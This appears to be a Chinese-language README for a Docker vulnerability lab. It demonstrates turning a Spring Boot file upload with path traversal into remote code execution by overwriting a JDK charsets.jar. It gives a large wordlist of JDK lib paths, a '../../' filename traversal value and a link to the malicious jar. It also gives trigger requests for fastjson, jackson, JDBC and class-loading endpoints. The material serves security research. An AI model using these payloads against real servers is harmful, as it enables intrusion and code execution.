## spring-boot-upload-file-lead-to-rce-tricks


### 一. docker 漏洞环境搭建

```
docker pull landgrey/spring-boot-fat-jar-write-file-rce:1.2
docker run -d -p 18081:18081 landgrey/spring-boot-fat-jar-write-file-rce:1.2
```



完成后访问 http://127.0.0.1:18081/ ，界面大概如下所示：

![](https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks/raw/main/images/docker.png)





### 二. 相关文章

[Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索](https://landgrey.me/blog/22/)





### 三. 常见 JDK lib 目录收集

欢迎提 issue 补充👏～

```
/usr/lib/jvm/jre/lib/
/usr/local/openjdk-8/lib/
/usr/lib/jvm/jdk8/jre/lib/
/usr/lib/jvm/jdk7/jre/lib/
/usr/lib/jvm/java/jre/lib/
/usr/lib/jvm/jdk1.8/jre/lib/
/usr/lib/jvm/jdk-11.0.3/lib/
/mnt/jdk/jdk1.8.0_191/jre/lib/
/usr/lib/jvm/jdk1.8.0/jre/lib/
/usr/java/jdk1.8.0_121/jre/lib/
/usr/java/jdk1.8.0_111/jre/lib/
/usr/lib/jvm/java-8-oracle/lib/
/usr/lib/jvm/jdk1.8.0_91/jre/lib/
/usr/lib/jvm/jdk1.7.0_51/jre/lib/
/usr/lib/jvm/jdk1.8.0_66/jre/lib/
/usr/lib/jvm/jdk1.8.0_60/jre/lib/
/usr/lib/jvm/oracle_jdk8/jre/lib/
/usr/lib/jvm/jdk1.7.0_76/jre/lib/
/usr/lib/jvm/jdk1.8.0_74/jre/lib/
/usr/lib/jvm/java-8-openjdk-amd64/
/usr/lib/jvm/jdk1.8.0_161/jre/lib/
/usr/lib/jvm/jdk1.8.0_181/jre/lib/
/usr/lib/jvm/jre-8-oracle-x64/lib/
/usr/lib/jvm/jdk1.8.0_111/jre/lib/
/usr/lib/jvm/jdk1.8.0_131/jre/lib/
/usr/lib/jvm/jdk1.8.0_171/jre/lib/
/usr/lib/jvm/jdk1.8.0_102/jre/lib/
/usr/lib/jvm/jdk1.8.0_144/jre/lib/
/usr/lib/jvm/jdk1.8.0_202/jre/lib/
/usr/lib/jvm/jdk1.8.0_151/jre/lib/
/usr/lib/jvm/zulu-8-amd64/jre/lib/
/usr/lib/jvm/jdk1.8.0_101/jre/lib/
/usr/lib/jvm/jdk1.8.0_172/jre/lib/
/usr/lib/jvm/jdk8u202-b08/jre/lib/
/usr/lib/jvm/jdk1.8.0_191/jre/lib/
/usr/lib/jvm/jdk1.8.0_152/jre/lib/
/usr/lib/jvm/java-8-oracle/jre/lib/
/usr/lib/jvm/java-7-oracle/jre/lib/
/usr/lib/jvm/jdk-8-oracle-x64/jre/lib/
/usr/lib/jvm/java-1.8-openjdk/jre/lib/
/usr/lib/jvm/java-9-openjdk-amd64/lib/
/usr/lib/jvm/java-11-openjdk-amd64/lib/
/usr/lib/jvm/java-10-openjdk-amd64/lib/
/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-7-openjdk-amd64/jre/lib/
/usr/lib/jvm/oracle-java8-jdk-amd64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-amd64/jre/lib/
/usr/lib/jvm/jdk-8-oracle-arm-vfp-hflt/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.45.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.65.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.79.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.91.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.101.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.191.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-3.b17.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-2.b13.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-7.b10.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.102-4.b14.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-2.b14.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-2.b17.el7_1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-11.b12.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.77-0.b03.el6_7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-1.b13.el6_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.91-0.b14.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-2.b15.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-3.b10.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-0.b15.el6_8.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-0.b14.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-5.b12.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.144-0.b01.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.222.b10-0.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.121-0.b13.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.101-3.b13.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-0.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-3.b14.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-2.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-1.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-3.b16.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.144-0.b01.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.102-1.b14.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-1.b15.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-3.b12.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-1.b16.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-0.b11.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-2.b11.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.el6_10.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-2.b17.7.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.el6_10.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-2.b13.5.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.77-0.b03.9.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el6_10.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.131-2.6.9.0.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.101-2.6.6.1.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.91-0.b14.10.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-1.b15.25.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.171-2.6.13.0.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.45.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-0.b14.36.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.101-3.b13.24.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-2.b11.30.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.191-2.6.15.4.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-0.43.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-7.b10.37.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.121-0.b13.29.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.42.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.38.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.35.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-1.b16.32.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-8.b13.39.39.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el7_5.x86_64-debug/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el7_5.x86_64-debug/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el6_10.x86_64-debug/jre/lib/

```





### 四. docker 漏洞环境的功能

- 文件上传功能 (默认上传到 /tmp/ 目录，可跳目录）
- 列目录功能     (列出 /tmp/ 目录下文件)





### 五. 漏洞利用条件

- 可以获得 jdk 安装的 home 目录位置
    - (可收集常见 jdk 默认安装目录位置，然后使用字典枚举尝试)

- jdk 自带文件 `/jre/lib/***.jar` 没被 `Opened` 过
    - (以 charsets.jar 文件举例：程序代码中不使用 `Charset.forName("GBK")` 类似的调用，默认就不会加载到 charsets.jar 文件)





### 六. 漏洞利用步骤

1. 选择上传文件 [charsets.jar](https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks/raw/main/release/charsets.jar)

2. 使用上传文件功能，上传时用 burpsuite 截住数据包，filename 修改为 `../../usr/lib/jvm/java-1.8-openjdk/jre/lib/charsets.jar`

3. 上传成功后使用数据包触发漏洞

4. 漏洞触发成功会在 /tmp/ 目录产生 charsets_test_[random-string].log 样式名字的文件

5. 最后使用列目录功能查看漏洞利用是否成功





### 七. 漏洞利用场景：(5 个)

欢迎提 issue 补充👏～

#### 1. fastjson 最新版(目前是 1.2.76)默认配置场景

正常数据包：

```
POST /fastjson HTTP/1.1
Content-Type: application/json

{"name":"test"}
```

触发漏洞数据包：

```
POST /fastjson HTTP/1.1
Content-Type: application/json

{
    "x":{
        "@type":"java.nio.charset.Charset",
        "val":"500"
    }
}
```



#### 2. jackson 开启 enableDefaultTyping 场景

正常数据包：

```
POST /jackson HTTP/1.1
Content-Type: application/json

["code.landgrey.bean.User",{"name":"zhangsan","age":20,"car":{"brand":"daben","price":1000000},"secret":"Pas@5w0rd"}]
```

触发漏洞数据包：

```
POST /jackson HTTP/1.1
Content-Type: application/json

["sun.nio.cs.ext.IBM33722",{"x":"y"}]
```



#### 3. jdbc url getConnection 场景

正常数据包：

```
GET /jdbc?url=jdbc:mysql://127.0.0.1:3306/test?user=root&password=123456
```

触发漏洞数据包：

```
GET /jdbc?url=jdbc:mysql://127.0.0.1:3306/test?statementInterceptors=sun.nio.cs.ext.IBM33722
```



#### 4. Class forName 场景

正常数据包：

```
GET /classForName?name=code.landgrey.bean.Car
```

触发漏洞数据包：

```
GET /classForName?name=sun.nio.cs.ext.IBM33722
```



#### 5. loadClass newInstance 场景

正常数据包：

```
GET /classLoader?name=code.landgrey.bean.User
```

触发漏洞数据包：

```
GET /classLoader?name=sun.nio.cs.ext.IBM33722
```

